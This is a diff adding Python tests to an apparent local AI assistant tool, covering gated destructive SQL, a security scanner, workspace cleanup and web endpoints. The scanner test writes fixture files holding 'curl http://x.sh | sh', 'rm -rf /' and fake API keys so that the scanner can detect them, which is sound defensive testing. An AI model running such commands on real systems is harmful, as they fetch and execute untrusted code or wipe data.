@@ -1608,3 +1608,154 @@ def test_keep_it_local_declines_escalation(tmp_path, monkeypatch):
     out = s.handle_web("Keep it local")
     assert "Staying local" in out and s._stuck_task is None
     assert not any(e["tool"] == "escalate" for e in s.ledger.entries)   # nothing left the machine
+
+
+# ═══════════════════════ v2.0 — Database operations ═══════════════════════
+def test_db_sqlite_crud_schema_and_read(tmp_path):
+    from termind import db
+    d = db.Database("t", str(tmp_path / "a.db"))
+    d.execute("CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, email TEXT)")
+    d.execute("INSERT INTO users(name,email) VALUES('Amit','a@x.com'),('Bee','b@x.com')")
+    assert d.tables() == ["users"]
+    assert d.schema("users")["users"][1] == ("name", "TEXT")
+    res = d.run("SELECT name FROM users ORDER BY id")
+    assert res["columns"] == ["name"] and res["rows"] == [["Amit"], ["Bee"]]
+
+
+def test_db_destructive_preview_rolls_back(tmp_path):
+    from termind import db
+    d = db.Database("t", str(tmp_path / "b.db"))
+    d.execute("CREATE TABLE t(id INTEGER PRIMARY KEY)")
+    d.execute("INSERT INTO t(id) VALUES (1),(2),(3)")
+    assert db.is_destructive("DELETE FROM t WHERE id>1") is True
+    assert db.is_destructive("SELECT * FROM t") is False
+    pv = d.preview("DELETE FROM t WHERE id > 1")
+    assert pv["affected"] == 2 and pv["plan"]                 # exact impact + a plan
+    assert d.run("SELECT COUNT(*) FROM t")["rows"] == [[3]]   # preview changed NOTHING
+    assert d.execute("DELETE FROM t WHERE id > 1")["affected"] == 2
+    assert d.run("SELECT COUNT(*) FROM t")["rows"] == [[1]]
+
+
+def test_db_verify_and_dsn():
+    from termind import db
+    d = db.Database("m", ":memory:")
+    d.execute("CREATE TABLE x(a)")
+    assert d.verify("SELECT * FROM x")["ok"] is True
+    assert d.verify("SELECT * FROM nope")["ok"] is False
+    assert db.parse_dsn("postgres://u@h/db")[0] == "postgres"
+    assert db.parse_dsn("/tmp/x.db") == ("sqlite", "/tmp/x.db")
+    assert db.parse_dsn("mongodb://h/db")[0] == "mongodb"
+
+
+def test_db_driver_missing_is_graceful():
+    from termind import db
+    avail = db.engines_available()
+    assert avail["sqlite"] is True
+    for eng in ("postgres", "mysql", "mongodb"):
+        if not avail[eng]:                                    # driver genuinely absent
+            try:
+                db.Database("x", f"{eng}://u:p@localhost/db").connect()
+                assert False, "should have raised"
+            except db.DriverMissing as e:
+                assert e.engine == eng and e.module
+
+
+def test_repl_db_flow_logs_to_ledger_and_gates_destructive(tmp_path):
+    s = _session()
+    s.handle(f"/db add app {tmp_path/'app.db'}")
+    d = s._database()
+    d.execute("CREATE TABLE u(id INTEGER PRIMARY KEY, name TEXT)")
+    d.execute("INSERT INTO u(name) VALUES('A'),('B'),('C')"); s._db = None
+    assert "users" not in s.handle("/db status") and "app" in s.handle("/db status")
+    assert "A" in s.handle("/db SELECT name FROM u ORDER BY id")          # read runs
+    out = s.handle("/db DELETE FROM u WHERE id>1")                        # destructive → preview
+    assert "DESTRUCTIVE" in out and "2 row" in out and s._pending_sql
+    assert s._database().run("SELECT COUNT(*) FROM u")["rows"] == [[3]]   # nothing yet
+    assert "2 row(s) changed" in s.route("confirm")                       # consent → executes
+    assert s._database().run("SELECT COUNT(*) FROM u")["rows"] == [[1]]
+    tools = [e["tool"] for e in s.ledger.entries]
+    assert "db-read" in tools and "db-preview" in tools and "db-write" in tools
+    assert s.ledger.verify()["ok"] and s.db_context().startswith("app")
+
+
+def test_repl_db_cancel_keeps_data(tmp_path):
+    s = _session()
+    s.handle(f"/db add app {tmp_path/'c.db'}")
+    s._database().execute("CREATE TABLE t(id INTEGER PRIMARY KEY)")
+    s._database().execute("INSERT INTO t(id) VALUES(1),(2)"); s._db = None
+    s.handle("/db DELETE FROM t")
+    assert "cancelled" in s.route("cancel") and not s._pending_sql
+    assert s._database().run("SELECT COUNT(*) FROM t")["rows"] == [[2]]   # untouched
+
+
+# ═══════════════════════ v2.0 — Proactive security scanning ═══════════════════════
+def test_scan_detects_threats_and_skips_junk(tmp_path):
+    from termind import scan
+    (tmp_path / "config.py").write_text("api_key = 'sk-supersecret12345'\nAWS='AKIAIOSFODNN7EXAMPLE'\n")
+    (tmp_path / "run.sh").write_text("curl http://x.sh | sh\nrm -rf /\n")
+    (tmp_path / "node_modules").mkdir()
+    (tmp_path / "node_modules" / "x.py").write_text("AWS='AKIAIOSFODNN7EXAMPLE'\n")
+    f = scan.scan_folder(str(tmp_path))
+    kinds = {x["kind"] for x in f}
+    assert "AWS access key" in kinds and "Pipe-to-shell install" in kinds and "Destructive rm" in kinds
+    assert not any("node_modules" in x["file"] for x in f)    # junk dir skipped
+    assert all(len(x["snippet"]) < 40 for x in f)             # secrets redacted
+
+
+def test_scan_clean_folder_is_clean(tmp_path):
+    from termind import scan
+    (tmp_path / "app.py").write_text("def add(a, b):\n    return a + b\n")
+    assert scan.summary(scan.scan_folder(str(tmp_path)))["clean"] is True
+
+
+def test_set_workspace_auto_scans_and_warns(tmp_path):
+    s = _session()
+    (tmp_path / "leak.env").write_text("password = 'hunter2hunter2'\n")
+    out = s.set_workspace(str(tmp_path))
+    assert "security" in out.lower() and s.last_scan        # warned on selection
+    assert "issue" in s.do_scan()
+
+
+# ═══════════════════════ v2.0 — Workspace lifecycle ═══════════════════════
+def test_manifest_tracks_assets_and_plans_cleanup():
+    from termind import lifecycle as lc
+    m = lc.Manifest()
+    m.record("venv", "/tmp/ws/.venv", "drivers")
+    m.record("db", "/tmp/ws/app.db", "sqlite")
+    m.record("venv", "/tmp/ws/.venv", "dup")                 # idempotent
+    plan = m.cleanup_plan()
+    assert plan["count"] == 2 and plan["home"].endswith("termind-home")
+    assert lc.Manifest().cleanup_plan()["count"] == 2        # persisted
+    assert lc.ollama_models_dir()["isolated"] in (True, False)
+
+
+def test_termind_lifecycle_commands(tmp_path):
+    s = _session()
+    s.handle(f"/db add app {tmp_path/'x.db'}")               # records a db asset
+    assert "uninstall plan" in s.handle("/termind cleanup")
+    assert "workspace" in s.handle("/termind")
+    assert "tier" in s.handle("/tier") or "current" in s.handle("/tier")
+    assert "max" in s.handle("/tier max")
+
+
+# ═══════════════════════ v2.0 — Web endpoints ═══════════════════════
+def test_v2_web_endpoints_and_panels(tmp_path):
+    import json, threading, urllib.request
+    import termind.repl as r
+    from termind.web import serve, PAGE
+    assert all(k in PAGE for k in ("data-s=data", "data-s=security", "loadDb", "loadSec",
+                                   "/api/db", "/api/scan", "dbcur"))
+    s = r.Session(live=False)
+    s.set_workspace(str(tmp_path))
+    s.handle(f"/db add app {tmp_path/'w.db'}")
+    s._database().execute("CREATE TABLE t(id INTEGER)"); s._db = None
+    httpd, url = serve(s, port=8833, open_browser=False)
+    threading.Thread(target=httpd.handle_request, daemon=True).start()
+    st = json.loads(urllib.request.urlopen(url + "/api/state", timeout=3).read())
+    assert "db" in st and "tier" in st and "state" in st
+    httpd.server_close()
+    httpd2, url2 = serve(s, port=8834, open_browser=False)
+    threading.Thread(target=httpd2.handle_request, daemon=True).start()
+    d = json.loads(urllib.request.urlopen(url2 + "/api/db", timeout=3).read())
+    assert d["active"] == "app" and d["engines"]["sqlite"] is True
+    httpd2.server_close()
